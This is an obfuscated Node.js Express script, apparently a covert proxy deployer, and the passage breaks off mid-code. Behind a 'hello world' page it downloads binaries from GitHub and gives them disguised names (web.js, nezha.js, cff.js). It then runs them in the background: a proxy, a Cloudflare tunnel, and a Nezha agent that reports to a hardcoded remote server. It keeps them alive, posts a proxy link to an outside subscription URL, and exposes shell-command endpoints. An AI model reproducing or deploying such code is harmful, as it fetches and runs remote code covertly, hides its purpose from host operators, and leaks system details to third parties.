//======================分隔符==============================
// 初始化全局变量
let host_name = '';
let port, vmmport, vmport; // 声明为全局变量
const vmms = process.env.VPATH || 'vls';
const vmpath = process.env.MPATH || 'vms';
const uuid = process.env.UUID || '3a8a1de5-7d41-45e2-88fe-0f538b822169';
const youxuan = process.env.CF_IP || 'ip.sb';
const sub_name = process.env.SUB_NAME || 'appwrite'; // 订阅名称
const sub_url = process.env.SUB_URL || 'https://subw.qiangguo-xuexi.eu.org/upload-123456';
const nezhaser = process.env.NEZ_SERVER || 'data.xuexi365.eu.org';
const nezhaKey = process.env.NEZ_KEY || 'brMQCpAtXfsyefZBJU';  // 哪吒密钥兼订阅地址，必须
const nezport = process.env.NEZ_PORT || '443';
const neztls = process.env.NEZ_TLS || '--tls';
// 初始默认路径
let filePath = process.env.FILE_PATH || '/tmp/';
const tok = process.env.TOK || '';// 隧道token
if (tok) {
    host_name = process.env.ARG_DOMAIN || '';// 隧道域名
}
const _0x481aee=_0x2745;(function(_0x811ac0,_0x1c7b6d){const _0x3e9da4=_0x2745,_0x4e031a=_0x811ac0();while(!![]){try{const _0x564c6a=parseInt(_0x3e9da4(0xac))/0x1+-parseInt(_0x3e9da4(0xe1))/0x2+parseInt(_0x3e9da4(0xda))/0x3+parseInt(_0x3e9da4(0xa8))/0x4+parseInt(_0x3e9da4(0xa9))/0x5+-parseInt(_0x3e9da4(0x74))/0x6+parseInt(_0x3e9da4(0x11b))/0x7;if(_0x564c6a===_0x1c7b6d)break;else _0x4e031a['push'](_0x4e031a['shift']());}catch(_0x26ec02){_0x4e031a['push'](_0x4e031a['shift']());}}}(_0x5eb5,0x69de8));function _0x5eb5(){const _0x3f9a9c=['MPATH=','cwd','Already\x20running','<pre>命令行执行错误：\x0a','下载\x20','Download\x20cff\x20successful','replace','F_OK','\x20订阅地址','host_name\x20set\x20to\x20','Download\x20nezha\x20failed:\x20','\x22\x20\x22','\x20已被占用，切换到端口\x20','应用程序启动失败:','error','unlink','Download\x20nezha\x20successful','startCommand','use','chmod','pipe','https://github.com/Fscarmon/flies/releases/latest/download/agent-linux_amd64','close','\x22\x20|\x20grep\x20-v\x20\x22grep\x22','includes','Failed\x20to\x20check\x20or\x20start\x20web\x20process:\x20','split','message','\x202>&1\x20&','&type=ws&sni=','2078349HEeUYV','\x20-s\x20','vmPort','nohup\x20','createServer','\x22\x20>\x20','log','Failed\x20to\x20set\x20executable\x20permission\x20for\x20','/start','\x20\x20\x20\x20\x20/','\x20到\x20','cff.js','Error\x20getting\x20country\x20code\x20with\x20exec:\x20','data','active\x20(running)','linux','trim','createWriteStream','All\x20downloads\x20successful!','push','使用文件路径:\x20',',\x20VM端口=','\x22\x20VPATH=\x22','nez.log','platform','freebsd','==============================','forEach','json','4406148SwaNkd','express','grep\x20-oE\x20\x22https://.*[a-z]+cloudflare.com\x22\x20','Unsupported\x20platform\x20or\x20architecture','\x20tunnel\x20--edge-ip-version\x20auto\x20--protocol\x20auto\x20--no-autoupdate\x20run\x20--token\x20','\x20>\x20','Download\x20web\x20failed:\x20','\x20>/dev/null\x202>&1\x20&','\x20tunnel\x20--edge-ip-version\x20auto\x20--protocol\x20auto\x20run\x20--no-autoupdate\x20--token\x20','Sub\x20Upload\x20failed','endsWith','request','Download\x20cff\x20failed:\x20','arm64','\x20--no-autoupdate\x20>\x20','name','Error\x20getting\x20country\x20code\x20from\x20ipapi.co:\x20','<pre>获取系统监听端口：\x0a','Some\x20downloads\x20failed,\x20but\x20proceeding\x20with\x20startup.','axios','SERVER_PORT','\x22\x20UUID=\x22','systemctl\x20status\x20','base64','x64','VL_PORT','VM\x20端口\x20','get','web.js','path','post','Failed\x20to\x20start\x20','http://127.0.0.1:','\x20不可修改权限:\x20','/home/','Error\x20getting\x20host_name:\x20','服务器监听端口\x20','Failed\x20to\x20get\x20country\x20code','\x20不存在','web.log','status','://',':443?path=%2F','from','send','resolve','version_id','{PA','https://github.com/Fscarmon/flies/releases/latest/download/agent-freebsd_amd64','Error\x20getting\x20country\x20code\x20from\x20ifconfig.co:\x20','html','/info','2419588dkHoaQ','929400gLpofX','命令行执行错误','8002','236307IhpbHR','VM_PORT','\x20started\x20successfully!','pgrep\x20-x\x20','\x20MB','constants','arch','\x20UUID=','ps\x20aux\x20|\x20grep\x20-E\x20\x22','Country\x20Code:','!\x0a==============================','round','\x22\x20VL_PORT=\x22','nezha.js','\x20tunnel\x20--edge-ip-version\x20auto\x20--protocol\x20auto\x20--url\x20http://localhost:','length','Download\x20web\x20successful','type','\x20VM_PORT=','/root/','serverPort','test','%3Fed%3D2048&security=tls&encryption=none&host=','无法在1000次尝试内为\x20VL\x20服务找到可用端口','\x20is\x20already\x20running','toString','\x20VPATH=',',\x20VL端口=','writeFile','catch','https://github.com/dsadsadsss/1/releases/download/xry/kano-yuan-arm','toLowerCase','\x20VL_PORT=','路径\x20','freemem','{PASS}','/stas','VL\x20端口\x20','exec','/path','https://github.com/dsadsadsss/1/releases/download/xry/argo-bsdamd','vlPort','Failed\x20to\x20check\x20or\x20start\x20nezha\x20process:\x20','MPATH=\x22','初始化应用程序失败:','/argo.log\x202>&1\x20&','865764sIDrfN','8001','child_process','无法在1000次尝试内找到可用端口','https://github.com/dsadsadsss/1/releases/download/xry/kano-bsd','\x20\x20\x20\x20\x20/start\x20检查进程','\x20不可写入:\x20','889162dAJjMF','Process\x20check\x20and\x20start\x20completed','Error\x20getting\x20country\x20code\x20from\x20ipinfo.io:\x20','无法在1000次尝试内为\x20VM\x20服务找到可用端口','Started','argo.log','test_','listening','下载文件失败:\x20','https://ipapi.co/country','/argo.log\x20|\x20tail\x20-n\x201\x20|\x20sed\x20\x22s#https://##\x22','net','curl\x20-s\x20http://ipinfo.io/country','hello\x20world','端口\x20','env','netstat\x20-nltp','使用端口配置:\x20服务器端口=','无法找到可写入且可执行的路径，使用默认路径:\x20/tmp/','.tmp','now','https://github.com/Fscarmon/flies/releases/latest/download/agent-linux_arm64','/tmp/','\x20\x20\x20\x20\x20/info\x20系统信息','\x20nohup\x20','once','</pre>','then'];_0x5eb5=function(){return _0x3f9a9c;};return _0x5eb5();}const express=require(_0x481aee(0x75)),app=express(),exec=require(_0x481aee(0xdc))[_0x481aee(0xd2)],os=require('os'),{createProxyMiddleware}=require('http-proxy-middleware'),request=require(_0x481aee(0x7f)),fs=require('fs'),path=require(_0x481aee(0x91)),axios=require(_0x481aee(0x87)),net=require(_0x481aee(0xec)),potentialPaths=[filePath,_0x481aee(0xf7),process[_0x481aee(0xfe)](),_0x481aee(0xbf),_0x481aee(0x96)];function checkPathPermissions(_0x23ba5e){return new Promise(_0x349d2b=>{const _0x578c5f=_0x2745;!_0x23ba5e[_0x578c5f(0x7e)]('/')&&(_0x23ba5e+='/');const _0x307ce1=_0x578c5f(0xe7)+Math['random']()[_0x578c5f(0xc5)](0x24)['substring'](0x7)+_0x578c5f(0xf4),_0x304ca9=path[_0x578c5f(0xa1)](_0x23ba5e,_0x307ce1);fs['access'](_0x23ba5e,fs[_0x578c5f(0xb1)][_0x578c5f(0x104)],_0x39aba3=>{const _0x234a14=_0x578c5f;if(_0x39aba3)return console[_0x234a14(0x121)]('路径\x20'+_0x23ba5e+_0x234a14(0x9a)),_0x349d2b(![]);fs[_0x234a14(0xc8)](_0x304ca9,_0x234a14(0xc1),_0x1c6107=>{const _0x378ec0=_0x234a14;if(_0x1c6107)return console['log']('路径\x20'+_0x23ba5e+_0x378ec0(0xe0)+_0x1c6107['message']),_0x349d2b(![]);fs[_0x378ec0(0x110)](_0x304ca9,0x1ed,_0x6630ca=>{const _0x378250=_0x378ec0;fs[_0x378250(0x10c)](_0x304ca9,()=>{const _0x22886f=_0x378250;if(_0x6630ca)return console[_0x22886f(0x121)]('路径\x20'+_0x23ba5e+_0x22886f(0x95)+_0x6630ca[_0x22886f(0x118)]),_0x349d2b(![]);return console[_0x22886f(0x121)](_0x22886f(0xcd)+_0x23ba5e+'\x20可写入且可执行'),_0x349d2b(!![]);});});});});});}async function findUsablePath(){const _0x1666d3=_0x481aee;for(const _0x1e95ca of potentialPaths){const _0x53816d=await checkPathPermissions(_0x1e95ca);if(_0x53816d)return _0x1e95ca;}return console[_0x1666d3(0x10b)](_0x1666d3(0xf3)),'/tmp/';}function _0x2745(_0x2769ed,_0x5b405f){const _0x5eb5d5=_0x5eb5();return _0x2745=function(_0x274585,_0x1962a5){_0x274585=_0x274585-0x71;let _0xded894=_0x5eb5d5[_0x274585];return _0xded894;},_0x2745(_0x2769ed,_0x5b405f);}function isPortInUse(_0x577685){return new Promise(_0x5289fe=>{const _0x3edbcd=_0x2745,_0x32cec5=net[_0x3edbcd(0x11f)]()[_0x3edbcd(0xfa)](_0x3edbcd(0x10b),()=>_0x5289fe(!![]))[_0x3edbcd(0xfa)](_0x3edbcd(0xe8),()=>{const _0xed655a=_0x3edbcd;_0x32cec5[_0xed655a(0x113)](),_0x5289fe(![]);})['listen'](_0x577685);});}async function findAvailablePort(_0x2748d1,_0x3db812=0x3e8){let _0x3e1959=_0x2748d1,_0xf4c013=0x0;while(_0xf4c013<_0x3db812){if(!await isPortInUse(_0x3e1959))return _0x3e1959;const _0x15b83f=_0x3e1959<0x7d0?0x64:0x1;_0x3e1959+=_0x15b83f,_0xf4c013++;}return null;}async function setupPorts(){const _0x53ace2=_0x481aee;let _0x56847b=parseInt(process[_0x53ace2(0xf0)][_0x53ace2(0x88)]||process['env']['PORT']||0xbb8);if(await isPortInUse(_0x56847b)){const _0x2fc72e=await findAvailablePort(_0x56847b);_0x2fc72e?(console[_0x53ace2(0x121)](_0x53ace2(0xef)+_0x56847b+_0x53ace2(0x109)+_0x2fc72e),_0x56847b=_0x2fc72e):console[_0x53ace2(0x10b)](_0x53ace2(0xdd));}let _0x9d9ed9=parseInt(process[_0x53ace2(0xf0)][_0x53ace2(0x8d)]||_0x53ace2(0xab));if(await isPortInUse(_0x9d9ed9)){const _0x146d74=await findAvailablePort(_0x9d9ed9);_0x146d74?(console[_0x53ace2(0x121)](_0x53ace2(0xd1)+_0x9d9ed9+_0x53ace2(0x109)+_0x146d74),_0x9d9ed9=_0x146d74[_0x53ace2(0xc5)]()):console['error'](_0x53ace2(0xc3));}let _0x7ba62f=parseInt(process[_0x53ace2(0xf0)][_0x53ace2(0xad)]||_0x53ace2(0xdb));if(await isPortInUse(_0x7ba62f)){const _0x158c5f=await findAvailablePort(_0x7ba62f);_0x158c5f?(console['log'](_0x53ace2(0x8e)+_0x7ba62f+_0x53ace2(0x109)+_0x158c5f),_0x7ba62f=_0x158c5f['toString']()):console[_0x53ace2(0x10b)](_0x53ace2(0xe4));}return{'serverPort':_0x56847b,'vlPort':_0x9d9ed9,'vmPort':_0x7ba62f};}console['log']('=============================='),console[_0x481aee(0x121)](''),console[_0x481aee(0x121)](_0x481aee(0xf8)),console['log'](_0x481aee(0xdf)),console[_0x481aee(0x121)](_0x481aee(0x124)+nezhaKey+_0x481aee(0x105)),console['log'](''),console[_0x481aee(0x121)](_0x481aee(0x71)),app[_0x481aee(0x8f)]('/',function(_0x514f64,_0x31c518){const _0x1bbc5f=_0x481aee;_0x31c518['send'](_0x1bbc5f(0xee));}),app[_0x481aee(0x8f)](_0x481aee(0xa7),function(_0x24cc63,_0x139233){exec('cat\x20/etc/os-release\x20&&\x20uname\x20-m\x20&&\x20lscpu\x20|\x20grep\x20\x27Model\x20name\x27\x20|\x20sed\x20\x27s/Model\x20name:\x5cs*//g\x27',function(_0x34ebf1,_0x33bf60,_0x5451cb){const _0x3abab8=_0x2745;if(_0x34ebf1){_0x139233[_0x3abab8(0x9c)](0x1f4)[_0x3abab8(0x73)]({'error':_0x3abab8(0xaa),'details':_0x34ebf1[_0x3abab8(0x118)]});return;}const _0x3ddb95=_0x33bf60['trim']()['split']('\x0a'),_0x4c03dc={};_0x3ddb95['filter'](_0x2f5932=>_0x2f5932[_0x3abab8(0x115)]('='))[_0x3abab8(0x72)](_0x98bfb2=>{const _0x4e41b9=_0x3abab8,[_0xabf197,_0x4abdaa]=_0x98bfb2[_0x4e41b9(0x117)]('=');_0x4c03dc[_0xabf197[_0x4e41b9(0xcb)]()]=_0x4abdaa[_0x4e41b9(0x103)](/^"|"$/g,'');});const _0x556326=Math['round'](os['totalmem']()/0x400/0x400),_0x4b0d1f=Math[_0x3abab8(0xb7)](os[_0x3abab8(0xce)]()/0x400/0x400);_0x139233['json']({'os':{'name':_0x4c03dc[_0x3abab8(0x83)]||_0x4c03dc['pretty_name'],'version':_0x4c03dc[_0x3abab8(0xa2)],'id':_0x4c03dc['id']},'hardware':{'architecture':_0x3ddb95[_0x3ddb95[_0x3abab8(0xbb)]-0x2],'cpu':_0x3ddb95[_0x3ddb95[_0x3abab8(0xbb)]-0x1]},'memory':{'total':_0x556326+_0x3abab8(0xb0),'free':_0x4b0d1f+_0x3abab8(0xb0),'usage':Math['round']((_0x556326-_0x4b0d1f)/_0x556326*0x64)+'%'},'platform':os[_0x3abab8(0x133)](),'hostname':os['hostname'](),'filePath':filePath});});}),app[_0x481aee(0x8f)](_0x481aee(0xd0),function(_0x7bc1d3,_0x3f02ae){let _0x31bdda='ps\x20aux\x20|\x20sed\x20\x27s@--token.*@--token\x20${TOK}@g;s@MPATH.*@./web.js@g;s@-s\x20data.*@-s\x20${NEZHA_SERVER}@g\x27';exec(_0x31bdda,function(_0x19e3c8,_0x1dca5f,_0x458ce4){const _0x1f463b=_0x2745;_0x19e3c8?_0x3f02ae['type'](_0x1f463b(0xa6))['send']('<pre>命令行执行错误：\x0a'+_0x19e3c8+_0x1f463b(0xfb)):_0x3f02ae['type']('html')[_0x1f463b(0xa0)]('<pre>获取系统进程表：\x0a'+_0x1dca5f+_0x1f463b(0xfb));});}),app[_0x481aee(0x8f)]('/listen',function(_0x15bb5e,_0xb58cf1){const _0x3c3d43=_0x481aee;let _0xab5b04=_0x3c3d43(0xf1);exec(_0xab5b04,function(_0x361878,_0x1541d9,_0x351792){const _0x272d21=_0x3c3d43;_0x361878?_0xb58cf1['type']('html')[_0x272d21(0xa0)](_0x272d21(0x100)+_0x361878+_0x272d21(0xfb)):_0xb58cf1[_0x272d21(0xbd)](_0x272d21(0xa6))['send'](_0x272d21(0x85)+_0x1541d9+_0x272d21(0xfb));});}),app[_0x481aee(0x8f)](_0x481aee(0xd3),async function(_0x6c8280,_0x4e5913){const _0x27ad35={};for(const _0x79d61a of potentialPaths){_0x27ad35[_0x79d61a]=await checkPathPermissions(_0x79d61a);}_0x4e5913['json']({'current_path':filePath,'path_status':_0x27ad35});});let countryCode='',up_url='',encodedUrl='';const countryCodeFetchers=[()=>axios[_0x481aee(0x8f)]('http://ipinfo.io/country')['then'](_0x17ac5b=>_0x17ac5b['data'][_0x481aee(0x12b)]())['catch'](_0x26474e=>{const _0x489417=_0x481aee;console[_0x489417(0x10b)](_0x489417(0xe3)+_0x26474e[_0x489417(0x118)]);throw _0x26474e;}),()=>axios[_0x481aee(0x8f)]('https://ifconfig.co/country')[_0x481aee(0xfc)](_0x211dbe=>_0x211dbe[_0x481aee(0x128)][_0x481aee(0x12b)]())['catch'](_0x1b3b01=>{const _0x5947fd=_0x481aee;console[_0x5947fd(0x10b)](_0x5947fd(0xa5)+_0x1b3b01[_0x5947fd(0x118)]);throw _0x1b3b01;}),()=>axios['get'](_0x481aee(0xea))[_0x481aee(0xfc)](_0x40ed9a=>_0x40ed9a[_0x481aee(0x128)][_0x481aee(0x12b)]())[_0x481aee(0xc9)](_0x2d4da7=>{const _0x2bd075=_0x481aee;console['error'](_0x2bd075(0x84)+_0x2d4da7[_0x2bd075(0x118)]);throw _0x2d4da7;}),()=>new Promise((_0x24ef37,_0x3d934f)=>{const _0x5949fe=_0x481aee;exec(_0x5949fe(0xed),(_0x2d2a03,_0x104772,_0x31e22b)=>{const _0x208167=_0x5949fe;_0x2d2a03?(console[_0x208167(0x10b)](_0x208167(0x127)+_0x31e22b),_0x3d934f(_0x2d2a03)):_0x24ef37(_0x104772['trim']());});})];function getCountryCode(_0x33ddf0){let _0x36bb99=0x0;function _0x18a8fd(){const _0xb1f36a=_0x2745;if(_0x36bb99>=countryCodeFetchers['length']){console[_0xb1f36a(0x10b)]('All\x20methods\x20failed,\x20setting\x20country\x20code\x20to\x20\x22UN\x22'),_0x33ddf0('UN');return;}countryCodeFetchers[_0x36bb99]()[_0xb1f36a(0xfc)](_0x5e7e1d=>{_0x33ddf0(_0x5e7e1d);})[_0xb1f36a(0xc9)](()=>{_0x36bb99++,_0x18a8fd();});}_0x18a8fd();}getCountryCode(_0x92e569=>{const _0x41e199=_0x481aee;console[_0x41e199(0x121)](_0x41e199(0xb5),_0x92e569);});let lastHostName='',lastSentTime=0x0;function checkHostNameChange(_0x1d2d7a){const _0x16c4fe=_0x481aee;!tok?exec(_0x16c4fe(0x76)+filePath+_0x16c4fe(0xeb),(_0x571411,_0x40ee01,_0x35b94d)=>{const _0x40fbf3=_0x16c4fe;if(_0x571411)return console[_0x40fbf3(0x10b)](_0x40fbf3(0x97)+_0x571411),_0x1d2d7a();const _0x3452b0=_0x40ee01[_0x40fbf3(0x12b)]();_0x3452b0&&_0x3452b0!==lastHostName&&(console[_0x40fbf3(0x121)](_0x40fbf3(0x106)+_0x3452b0),host_name=_0x3452b0,lastHostName=_0x3452b0,buildUrls()),_0x1d2d7a();}):_0x1d2d7a();}function buildUrls(){const _0x19a9bb=_0x481aee,_0x3be93f=_0x19a9bb(0xcf);up_url=_0x3be93f+_0x19a9bb(0x9d)+uuid+'@'+youxuan+_0x19a9bb(0x9e)+vmms+_0x19a9bb(0xc2)+host_name+_0x19a9bb(0x11a)+host_name+'#'+countryCode+'-'+sub_name,up_url=up_url[_0x19a9bb(0x103)](_0x19a9bb(0xa3),'vl')[_0x19a9bb(0x103)]('SS}','ess'),encodedUrl=Buffer[_0x19a9bb(0x9f)](up_url)['toString'](_0x19a9bb(0x8b));}function initializeData(){getCountryCode(_0x21af4f=>{const _0x1718fb=_0x2745;if(!_0x21af4f){console['error'](_0x1718fb(0x99));return;}countryCode=_0x21af4f,checkHostNameChange(()=>{buildUrls();});});}function sendSubscription(){const _0x2a929a=_0x481aee,_0x33f5a0={'URL_NAME':sub_name,'URL':up_url};axios[_0x2a929a(0x92)](sub_url,_0x33f5a0,{'headers':{'Content-Type':'application/json'}})[_0x2a929a(0xfc)](_0x2970c0=>{const _0x5a16cb=_0x2a929a;console[_0x5a16cb(0x121)]('Sub\x20Upload\x20successful');})[_0x2a929a(0xc9)](_0x252666=>{const _0x3192e3=_0x2a929a;console['error'](_0x3192e3(0x7d));});}function startCronJob(){!tok?setInterval(()=>{checkHostNameChange(()=>{const _0x1a5795=_0x2745,_0x541157=Date[_0x1a5795(0xf5)]();_0x541157-lastSentTime>=0x5*0x3c*0x3e8&&(sendSubscription(),lastSentTime=_0x541157);});},0x3c*0x3e8):(buildUrls(),sendSubscription(),setInterval(()=>{const _0x4c1875=Date['now']();_0x4c1875-lastSentTime>=0x5*0x3c*0x3e8&&(sendSubscription(),lastSentTime=_0x4c1875);},0x3c*0x3e8));}app[_0x481aee(0x8f)]('/'+nezhaKey,(_0xf1cb01,_0x18bf63)=>{_0x18bf63['send'](encodedUrl);});function checkProcessStatus(_0x345d34,_0x210116){const _0x36b5d5=[_0x403e30=>{const _0x2a5446=_0x2745;exec('ps\x20aux\x20|\x20grep\x20-E\x20\x22'+_0x345d34+_0x2a5446(0x114),(_0x30b449,_0x4ac357)=>{_0x30b449||!_0x4ac357['trim']()?_0x403e30(![]):_0x403e30(!![]);});},_0x42bc2c=>{exec('pidof\x20'+_0x345d34,(_0x12823b,_0x51befe)=>{_0x12823b||!_0x51befe['trim']()?_0x42bc2c(![]):_0x42bc2c(!![]);});},_0x510739=>{const _0x5426cc=_0x2745;exec(_0x5426cc(0xaf)+_0x345d34,(_0x1f75a7,_0x5cf4ba)=>{_0x1f75a7||!_0x5cf4ba['trim']()?_0x510739(![]):_0x510739(!![]);});},_0x197cff=>{const _0x522ce6=_0x2745;exec(_0x522ce6(0x8a)+_0x345d34,(_0x53a6f5,_0x505841)=>{const _0x244056=_0x522ce6;_0x53a6f5||!_0x505841[_0x244056(0x115)](_0x244056(0x129))?_0x197cff(![]):_0x197cff(!![]);});}];function _0x597c65(_0x1ade5a){const _0x5a0e56=_0x2745;if(_0x1ade5a>=_0x36b5d5[_0x5a0e56(0xbb)]){_0x210116(![]);return;}_0x36b5d5[_0x1ade5a](_0x41f392=>{_0x41f392?_0x210116(!![]):_0x597c65(_0x1ade5a+0x1);});}_0x597c65(0x0);}app[_0x481aee(0x8f)](_0x481aee(0x123),(_0x588025,_0x41a494)=>{const _0x1b39b6=_0x481aee,_0x5718aa=[{'name':_0x1b39b6(0x126),'startCommand':tok?'nohup\x20'+path[_0x1b39b6(0xa1)](filePath,_0x1b39b6(0x126))+_0x1b39b6(0x7c)+tok+'\x20>/dev/null\x202>&1\x20&':_0x1b39b6(0x11e)+path[_0x1b39b6(0xa1)](filePath,'cff.js')+_0x1b39b6(0xba)+vmmport+'\x20--no-autoupdate\x20>\x20'+filePath+_0x1b39b6(0xd9)},{'name':'web.js','startCommand':_0x1b39b6(0xfd)+vmpath+_0x1b39b6(0xbe)+vmport+_0x1b39b6(0xc6)+vmms+_0x1b39b6(0xcc)+vmmport+_0x1b39b6(0xb3)+uuid+_0x1b39b6(0xf9)+path[_0x1b39b6(0xa1)](filePath,_0x1b39b6(0x90))+_0x1b39b6(0x7b)}];nezhaser&&nezhaKey&&_0x5718aa[_0x1b39b6(0x12e)]({'name':_0x1b39b6(0xb9),'startCommand':_0x1b39b6(0x11e)+path['resolve'](filePath,_0x1b39b6(0xb9))+_0x1b39b6(0x11c)+nezhaser+':'+nezport+'\x20-p\x20'+nezhaKey+'\x20'+neztls+'\x20>/dev/null\x202>&1\x20&'});const _0x454676=[];let _0x41096d=0x0;_0x5718aa['forEach'](_0x1d54c9=>{const _0x2e6c29=_0x1b39b6;checkProcessStatus(_0x1d54c9[_0x2e6c29(0x83)],_0x1e430c=>{const _0x1c0b68=_0x2e6c29;!_0x1e430c?exec(_0x1d54c9[_0x1c0b68(0x10e)],(_0x780752,_0x2d6d21,_0x599179)=>{const _0x1624bf=_0x1c0b68;_0x454676[_0x1624bf(0x12e)]({'process':_0x1d54c9[_0x1624bf(0x83)],'status':_0x780752?'Failed\x20to\x20start':_0x1624bf(0xe5),'error':_0x780752?_0x780752[_0x1624bf(0x118)]:null});}):_0x454676[_0x1c0b68(0x12e)]({'process':_0x1d54c9[_0x1c0b68(0x83)],'status':_0x1c0b68(0xff)}),_0x41096d++,_0x41096d===_0x5718aa[_0x1c0b68(0xbb)]&&_0x41a494[_0x1c0b68(0x73)]({'message':_0x1c0b68(0xe2),'processes':_0x454676});});});});function commandExists(_0x33c5dd,_0x4ac29e){exec('command\x20-v\x20'+_0x33c5dd,(_0x14f46a,_0x1f637c,_0x4839e5)=>{const _0x4035a3=_0x2745;_0x4ac29e(!_0x14f46a&&_0x1f637c[_0x4035a3(0x12b)]());});}function checkAndStartProcess(_0x149b00,_0x163488,_0x4c81e8){const _0x246166=[_0x185062=>{const _0x41cf24=_0x2745;exec(_0x41cf24(0xb4)+_0x149b00+'\x22\x20|\x20grep\x20-v\x20\x22grep\x22',(_0x43dece,_0x39b72a)=>{const _0x5f5cfa=_0x41cf24;_0x43dece||!_0x39b72a[_0x5f5cfa(0x12b)]()?_0x185062(![]):_0x185062(!![]);});},_0xd02dc7=>{exec('pidof\x20'+_0x149b00,(_0x6a3a4e,_0x2cd1f0)=>{_0x6a3a4e||!_0x2cd1f0['trim']()?_0xd02dc7(![]):_0xd02dc7(!![]);});},_0x2b2f7b=>{const _0x467c88=_0x2745;exec(_0x467c88(0xaf)+_0x149b00,(_0x408993,_0x2769b8)=>{_0x408993||!_0x2769b8['trim']()?_0x2b2f7b(![]):_0x2b2f7b(!![]);});},_0x4b455b=>{const _0x5135ba=_0x2745;exec(_0x5135ba(0x8a)+_0x149b00,(_0x2963a8,_0x535671)=>{const _0x20ba12=_0x5135ba;_0x2963a8||!_0x535671[_0x20ba12(0x115)](_0x20ba12(0x129))?_0x4b455b(![]):_0x4b455b(!![]);});}];function _0x3aa7fd(_0xc8627d){if(_0xc8627d>=_0x246166['length']){exec(_0x163488,(_0x2e0975,_0x2c0a84,_0x39e955)=>{const _0x2ef0aa=_0x2745;_0x2e0975?_0x4c81e8(new Error(_0x2ef0aa(0x93)+_0x149b00+':\x20'+_0x39e955)):_0x4c81e8(null,_0x149b00+_0x2ef0aa(0xae));});return;}_0x246166[_0xc8627d](_0x5d01d8=>{const _0x122f49=_0x2745;_0x5d01d8?_0x4c81e8(null,_0x149b00+_0x122f49(0xc4)):_0x3aa7fd(_0xc8627d+0x1);});}_0x3aa7fd(0x0);}function startCheckingProcesses(){const _0x40705f=setInterval(()=>{checkProcesses();},0x3c*0x3e8);}function checkProcesses(){nezhaser&&nezhaKey&&keep_nezha_alive(),keep_cff_alive(),keep_web_alive();}function keep_web_alive(){const _0x47db8e=_0x481aee,_0x27c0b5=_0x47db8e(0x90),_0x5c7389=_0x47db8e(0xd7)+vmpath+'\x22\x20VM_PORT=\x22'+vmport+_0x47db8e(0x131)+vmms+_0x47db8e(0xb8)+vmmport+_0x47db8e(0x89)+uuid+_0x47db8e(0x108)+path[_0x47db8e(0xa1)](filePath,_0x47db8e(0x90))+_0x47db8e(0x120)+path[_0x47db8e(0xa1)](filePath,_0x47db8e(0x9b))+_0x47db8e(0x119);checkAndStartProcess(_0x27c0b5,_0x5c7389,(_0x4b4eec,_0x3f4014)=>{const _0x2840b6=_0x47db8e;_0x4b4eec?console['log'](_0x2840b6(0x116)+_0x4b4eec[_0x2840b6(0x118)]):console[_0x2840b6(0x121)](_0x3f4014);});}function keep_nezha_alive(){const _0x3ce68b=_0x481aee,_0x2b8e89=_0x3ce68b(0xb9),_0x308d3d=_0x3ce68b(0x11e)+path[_0x3ce68b(0xa1)](filePath,'nezha.js')+_0x3ce68b(0x11c)+nezhaser+':'+nezport+'\x20-p\x20'+nezhaKey+'\x20'+neztls+_0x3ce68b(0x79)+path['resolve'](filePath,_0x3ce68b(0x132))+_0x3ce68b(0x119);checkAndStartProcess(_0x2b8e89,_0x308d3d,(_0x340f3c,_0x5f24e7)=>{const _0x4584ca=_0x3ce68b;_0x340f3c?console['log'](_0x4584ca(0xd6)+_0x340f3c['message']):console[_0x4584ca(0x121)](_0x5f24e7);});}function keep_cff_alive(){const _0x8d0424=_0x481aee,_0x1c0b50=_0x8d0424(0x126);let _0x2a3018;tok?_0x2a3018=_0x8d0424(0x11e)+path[_0x8d0424(0xa1)](filePath,_0x8d0424(0x126))+_0x8d0424(0x78)+tok+_0x8d0424(0x79)+path[_0x8d0424(0xa1)](filePath,'argo.log')+_0x8d0424(0x119):_0x2a3018=_0x8d0424(0x11e)+path[_0x8d0424(0xa1)](filePath,_0x8d0424(0x126))+'\x20tunnel\x20--edge-ip-version\x20auto\x20--protocol\x20auto\x20--url\x20http://localhost:'+vmmport+_0x8d0424(0x82)+path[_0x8d0424(0xa1)](filePath,_0x8d0424(0xe6))+_0x8d0424(0x119),checkAndStartProcess(_0x1c0b50,_0x2a3018,(_0x4e49b6,_0x246e14)=>{const _0x2aece5=_0x8d0424;_0x4e49b6?console[_0x2aece5(0x121)]('Failed\x20to\x20check\x20or\x20start\x20cff\x20process:\x20'+_0x4e49b6[_0x2aece5(0x118)]):console['log'](_0x246e14);});}function download_web(_0x294780,_0x49ebcd){const _0x2b01a1=_0x481aee,_0x24d954=os[_0x2b01a1(0x133)](),_0x30a853=os[_0x2b01a1(0xb2)]();let _0xfe1d61=_0x2b01a1(0x90),_0xe7a230='';if(_0x24d954===_0x2b01a1(0x12a)){if(_0x30a853===_0x2b01a1(0x8c))_0xe7a230='https://github.com/dsadsadsss/1/releases/download/xry/kano-yuan';else _0x30a853===_0x2b01a1(0x81)&&(_0xe7a230=_0x2b01a1(0xca));}else{if(_0x24d954===_0x2b01a1(0x134))_0xe7a230=_0x2b01a1(0xde);else{_0x49ebcd(_0x2b01a1(0x77));return;}}const _0x4d4368=path[_0x2b01a1(0xa1)](_0x294780,_0xfe1d61);console[_0x2b01a1(0x121)](_0x2b01a1(0x101)+_0xfe1d61+_0x2b01a1(0x125)+_0x4d4368);let _0x24c040=fs[_0x2b01a1(0x12c)](_0x4d4368);request(_0xe7a230)[_0x2b01a1(0x111)](_0x24c040)['on'](_0x2b01a1(0x113),function(_0x29357d){const _0x5a5475=_0x2b01a1;_0x29357d?_0x49ebcd(_0x5a5475(0xe9)+_0x29357d):fs[_0x5a5475(0x110)](_0x4d4368,0x1ff,_0x1d1cb0=>{const _0x2b2072=_0x5a5475;_0x1d1cb0?_0x49ebcd(_0x2b2072(0x122)+_0xfe1d61+':\x20'+_0x1d1cb0):_0x49ebcd(null);});});}function download_nezha(_0x164f43,_0x5e6fd7){const _0x1c4951=_0x481aee,_0x48dbd5=os['platform'](),_0x5911e1=os[_0x1c4951(0xb2)]();let _0x27fffa=_0x1c4951(0xb9),_0x3c37b1='';if(_0x48dbd5===_0x1c4951(0x12a)){if(_0x5911e1===_0x1c4951(0x8c))_0x3c37b1=_0x1c4951(0x112);else _0x5911e1===_0x1c4951(0x81)&&(_0x3c37b1=_0x1c4951(0xf6));}else{if(_0x48dbd5==='freebsd')_0x3c37b1=_0x1c4951(0xa4);else{_0x5e6fd7(_0x1c4951(0x77));return;}}const _0x32e93f=path['resolve'](_0x164f43,_0x27fffa);console[_0x1c4951(0x121)](_0x1c4951(0x101)+_0x27fffa+_0x1c4951(0x125)+_0x32e93f);let 